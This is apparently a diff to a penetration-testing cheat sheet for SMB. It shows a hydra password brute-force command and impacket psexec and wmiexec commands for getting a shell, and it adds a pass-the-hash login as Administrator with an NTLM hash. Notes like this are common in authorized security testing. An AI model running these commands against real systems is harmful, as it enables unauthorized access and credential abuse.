@@ -93,6 +93,7 @@ hydra -L users.txt -P passwords.txt smb://<target>
 #try to get shell if $ADMIN having write permission for the user
 impacket-psexec username@<ip address>
 impacket-wmiexec username@<ip address>
+impacket-smbclient -hashes:<NTLM hash> Administrator@<ip address>
 
 ```
 
